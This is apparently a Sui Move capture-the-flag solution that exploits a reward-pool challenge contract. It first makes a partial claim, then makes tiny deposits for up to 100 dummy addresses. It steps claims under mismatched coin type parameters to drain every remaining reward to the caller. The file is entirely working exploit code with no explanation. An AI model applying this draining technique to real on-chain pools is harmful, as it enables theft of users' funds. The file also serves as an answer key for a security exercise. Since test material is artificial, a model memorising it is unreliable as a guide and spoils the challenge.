module the_solution::solution;

use challenge::challenge::Challenge;
use challenge::deposit_coin::DEPOSIT_COIN;
use challenge::reward_coin::REWARD_COIN;

const DUMMY_ADDRESSES: vector<address> = vector[
    @0x1, @0x2, @0x3, @0x4, @0x5, @0x6, @0x7, @0x8, @0x9, @0xa,
    @0xb, @0xc, @0xd, @0xe, @0xf, @0x10, @0x11, @0x12, @0x13, @0x14,
    @0x15, @0x16, @0x17, @0x18, @0x19, @0x1a, @0x1b, @0x1c, @0x1d, @0x1e,
    @0x1f, @0x20, @0x21, @0x22, @0x23, @0x24, @0x25, @0x26, @0x27, @0x28,
    @0x29, @0x2a, @0x2b, @0x2c, @0x2d, @0x2e, @0x2f, @0x30, @0x31, @0x32,
    @0x33, @0x34, @0x35, @0x36, @0x37, @0x38, @0x39, @0x3a, @0x3b, @0x3c,
    @0x3d, @0x3e, @0x3f, @0x40, @0x41, @0x42, @0x43, @0x44, @0x45, @0x46,
    @0x47, @0x48, @0x49, @0x4a, @0x4b, @0x4c, @0x4d, @0x4e, @0x4f, @0x50,
    @0x51, @0x52, @0x53, @0x54, @0x55, @0x56, @0x57, @0x58, @0x59, @0x5a,
    @0x5b, @0x5c, @0x5d, @0x5e, @0x5f, @0x60, @0x61, @0x62, @0x63, @0x64
];

#[allow(lint(self_transfer))]
public fun solve(
    challenge: &mut Challenge<REWARD_COIN, DEPOSIT_COIN>,
    ctx: &mut TxContext,
) {
    {
        challenge.emulate_deposit(ctx);
    };

    let (pool, oracle) = challenge.get_pool_and_oracle();
    let user = ctx.sender();
    let mut deposits_to_step = pool.get_deposits_count();

    // partial claim to get some rewards
    let total_deposited = pool.get_deposit_amount<REWARD_COIN, DEPOSIT_COIN>(user);
    assert!(total_deposited >= deposits_to_step);
    let mut potato = pool.claim_start<REWARD_COIN, DEPOSIT_COIN>(deposits_to_step, oracle, ctx);
    while (deposits_to_step > 0) {
        deposits_to_step = deposits_to_step - 1;
        let step_user = pool.get_user(deposits_to_step);
        if (step_user != user) {
            pool.claim_step<REWARD_COIN, DEPOSIT_COIN>(step_user, oracle, &mut potato);
        };
    };
    let (mut rewards, mut claimed) = pool.claim_complete<REWARD_COIN, DEPOSIT_COIN>(potato, ctx);

    // claim all remaining rewards in pool
    let total_deposited = pool.get_deposit_amount<REWARD_COIN, DEPOSIT_COIN>(user);
    deposits_to_step = pool.get_deposits_count() - 1; // -1 for own deposit
    let dummy_addresses = DUMMY_ADDRESSES;
    assert!(deposits_to_step <= dummy_addresses.length()); // otherwise increase the size of DUMMY_ADDRESSES

    potato = pool.claim_start<REWARD_COIN, DEPOSIT_COIN>(total_deposited, oracle, ctx);
    while (deposits_to_step > 0) {
        deposits_to_step = deposits_to_step - 1;
        let dummy_user = dummy_addresses[deposits_to_step];

        let zero_value_coins = rewards.split(1, ctx);
        pool.deposit_for<REWARD_COIN, REWARD_COIN>(dummy_user, zero_value_coins, oracle);
        pool.claim_step<REWARD_COIN, REWARD_COIN>(dummy_user, oracle, &mut potato);
    };
    let (all_rewards, claimed_leftover) = pool.claim_complete<REWARD_COIN, DEPOSIT_COIN>(potato, ctx);
    rewards.join(all_rewards);
    claimed.join(claimed_leftover);

    transfer::public_transfer(rewards, user);
    transfer::public_transfer(claimed, user);
}
